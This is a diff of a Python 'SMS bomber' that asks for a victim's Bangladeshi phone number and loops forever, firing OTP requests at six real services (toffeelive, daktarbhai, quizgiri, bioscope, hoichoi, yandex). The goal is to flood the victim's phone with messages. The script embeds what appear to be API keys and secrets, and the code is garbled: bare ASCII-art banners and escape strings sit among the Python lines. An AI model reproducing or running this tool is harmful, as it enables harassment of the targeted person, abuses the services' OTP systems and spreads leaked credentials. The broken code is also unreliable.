@@ -1,87 +1,232 @@
-#Get Target Number Of Victim
-number  = input("Enter Your Target Number: ")
+      \033[1;91m:  
  
-#Get The Amount of SMS To Send
-amount = int(input("Enter Your Amount: "))
+@@@  @@                                  @@  @@@
+ 
+ @@@@@@                                 @@@@@@
+ 
+  @@@@@           88888888888           @@@@@
+ 
+    @@@@        888888888888888        @@@@
+ 
+      @@@@    8888888888888888888    @@@@
+ 
+        @@@@888 88888888888888 8888@@@@
+ 
+           8888  888888888888  88888@
+ 
+          88888    88888888    888888
+ 
+          88888      8888      888888
+ 
+          888888888888888888888888888
+ 
+           88888888888  888888888888
+ 
+            88888888      888888888
+ 
+             8888888888888888888888
+ 
+              88888888888888888888
+ 
+                8888888888888888
+ 
+             @@@@ ||||||||||| @@@@
+ 
+           @@@@   |||||||||||  @@@@
+ 
+          @@@@                   @@@@ 
+ 
+        @@@@@                      @@@@@
+ 
+     @@ @@@   Mx-Fahim-Vau    @@@ @@
+ 
+import requests as rq
+ 
+from requests.structures import CaseInsensitiveDict
+ 
+  
+ 
+    \033[1;96m          ▒▒▒▒▒▒▒▒▒▒▒▒  ╱▔▔▔▔╲ ▒▒▒▒▒▒▒▒▒▒▒▒ 
+ 
+  \033[1;96m          ▒▒▒▒▒▒▒▒▒▒▒▒ ▕▕╲┊┊╱▏▏▒▒▒▒▒▒▒▒▒▒▒▒ 
+ 
+  \033[1;96m          ▒▒▒▒▒▒▒▒▒▒▒▒ ▕▕▂╱╲▂▏▏▒▒▒▒▒▒▒▒▒▒▒▒ 
+ 
+ \033[1;96m           ▒▒▒▒▒▒▒▒▒▒▒▒  ╲┊┊┊┊╱ ▒▒▒▒▒▒▒▒▒▒▒▒ 
+ 
+ \033[1;96m           ▒▒▒▒▒▒▒▒▒▒▒▒  ▕╲▂▂╱▏ ▒▒▒▒▒▒▒▒▒▒▒▒
+ 
+ \033[1;96m           ▒▒▒▒▒▒▒▒▒ ╱▔▔▔▔┊┊┊┊▔▔▔▔╲▒▒▒▒▒▒▒▒▒
+ 
+  \033[1;96m          ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ 
+ 
+       \033[1;93m  ███████▒▒    M.M.G.S/BD-SMS-BOMBER   ▒▒████████
+ 
+  
+ 
+number=str(input("[!] Enter Target Number: +88"))
  
  
-#Our First API Function
-def api1():
-    #API URL
-    url1 = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"
-    
-    #API Data
-    data = {
-      "requestType": "send",
-      "phoneNumber": "+88" + number,
-      "emailConsent": "true",
-      "whatsappConsent": "true"
-    }
-    
-    #Request Header
-    headers = {
-        "Content-Type" : "application/json"
-    }
-    
-    #Request Our API
-    response = requests.post(url, json = data, headers1 = headers1).status_code
-    
-    #Return Our Response Staus Code
-    return response
  
-#Our Second API Function
-def api2():
-    #API URL
-    url2 = "https://api.bongo-solutions.com/auth/api/login/send-otp"
-    
-    #API Data
-    data = {
-        "operator" : "all",
-        "msisdn": "88" + number
-    }
-    
-    #Request Header
-    headers2 = {
-        "Content-Type" : "application/json"
-    }
-    
-    #Request Our API
-    response = requests.post(url, json = data, headers2 = headers2).status_code
-    
-    #Return Our Response Status Code
-    return response
+def toffee():
+ 
+      \033[1;91m: 
+ 
+      
+ 
+      
+ 
+    url = "https://toffeelive.com/app/service.php"
+ 
+    headers = CaseInsensitiveDict()
+ 
+    headers["Content-Type"] = "application/x-www-form-urlencoded"
+ 
+    data = "phoneNumber="+number+"&route=auth_verify_mobile_no"
+ 
+    resp = rq.post(url, headers=headers, data=data)
+ 
+    if resp.status_code==200:
+ 
+        print("[+] OTP Sent Successfully, Press CTRL + C To Close")
+ 
+    elif resp.status_code==201:
+ 
+        print("[+] OTP Sent Successfully, Press CTRL + C To Close")
+ 
+    else:
+ 
+        print("[-] OTP Did Not Sent Successfully, Press CTRL + C To Close")
  
  
-print("\nBombing Started!\n")
  
-#Our SMS Sent Amount Variable
-done = 0
+def daktarbhai():
  
-#Loop To Execute Our Bombing
+    url = "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88"+number+"&platform=app&activity=login"
+ 
+    resp = rq.post(url)
+ 
+    if resp.status_code==200:
+ 
+        print("[+] OTP Sent Successfully, Press CTRL + C To Close")
+ 
+    elif resp.status_code==201:
+ 
+        print("[+] OTP Sent Successfully, Press CTRL + C To Close")
+ 
+    else:
+ 
+        print("[-] OTP Did Not Sent Successfully, Press CTRL + C To Close")
+ 
+ 
+ 
+def quizgiri():
+ 
+    data = {"phone":"+88"+number, "fcm_token":"null"}
+ 
+    url = "https://developer.quizgiri.xyz/api/v2.0/send-otp"
+ 
+    resp = rq.post(url, json=data)
+ 
+    if resp.status_code==200:
+ 
+        print("[+] OTP Sent Successfully, Press CTRL + C To Close")
+ 
+    elif resp.status_code==201:
+ 
+        print("[+] OTP Sent Successfully, Press CTRL + C To Close")
+ 
+    else:
+ 
+        print("[-] OTP Did Not Sent Successfully, Press CTRL + C To Close")
+ 
+ 
+ 
+def bioscope():
+ 
+    url = "https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"
+ 
+    resp = rq.post(url)
+ 
+    if resp.status_code==200:
+ 
+        print("[+] OTP Sent Successfully, Press CTRL + C To Close")
+ 
+    elif resp.status_code==201:
+ 
+        print("[+] OTP Sent Successfully, Press CTRL + C To Close")
+ 
+    else:
+ 
+        print("[-] OTP Did Not Sent Successfully, Press CTRL + C To Close")
+ 
+ 
+ 
+def hoichoi():
+ 
+    header = {"x-api-key": "PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef"}
+ 
+    data = {"requestType":"send", "phoneNumber":"+88"+number, "screenName":"signin"}
+ 
+    url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"
+ 
+    resp = rq.post(url, json=data, headers=header)
+ 
+    if resp.status_code==200:
+ 
+        print("[+] OTP Sent Successfully, Press CTRL + C To Close")
+ 
+    elif resp.status_code==201:
+ 
+        print("[+] OTP Sent Successfully, Press CTRL + C To Close")
+ 
+    else:
+ 
+        print("[-] OTP Did Not Sent Successfully, Press CTRL + C To Close")
+ 
+ 
+ 
+def yandex():
+ 
+    data = {"phone_number":"+88"+number}
+ 
+    url = "https://eda.yandex/api/v1/user/request_authentication_code"
+ 
+    resp = rq.post(url, json=data)
+ 
+    if resp.status_code==200:
+ 
+        print("[+] OTP Sent Successfully, Press CTRL + C To Close")
+ 
+    elif resp.status_code==201:
+ 
+        print("[+] OTP Sent Successfully, Press CTRL + C To Close")
+ 
+    else:
+ 
+        print("[-] OTP Did Not Sent Successfully, Press CTRL + C To Close")
+ 
+ 
+ 
+ 
+ 
 while True:
-    #Calling Our First API
-    code = api1()
-    
-    #If Our Request Is Successfull, Than Do This
-    if (code == 200):
-        done += 1
-        print(str(done) + " Sms Sent Successfully!!")
-    #If Not Successfull, Than Do This
-    else:
-        print("Sms Send Failed!")
  
-    #Calling Our Second API
-    code = api2()
-    
-    #If Our Request Is Successfull, Than Do This
-    if (code == 200):
-        done += 1
-        print(str(done) + " Sms Sent Successfully!!")
-    #If Not Successfull, Than Do This
-    else:
-        print("Sms Send Failed!")
-    
-     #If Our Sent Sms Amounts and Our Desired Amounts  are same, Than Break The Loop
-    if (done == amount):
-        print("\nBombing Finished!")
-        break
+    toffee()
+ 
+    daktarbhai()
+ 
+    quizgiri()
+ 
+    bioscope()
+ 
+    hoichoi()
+ 
+    yandex()
+ 
+ 
+ 
+ 
+ 
+ 
+ 
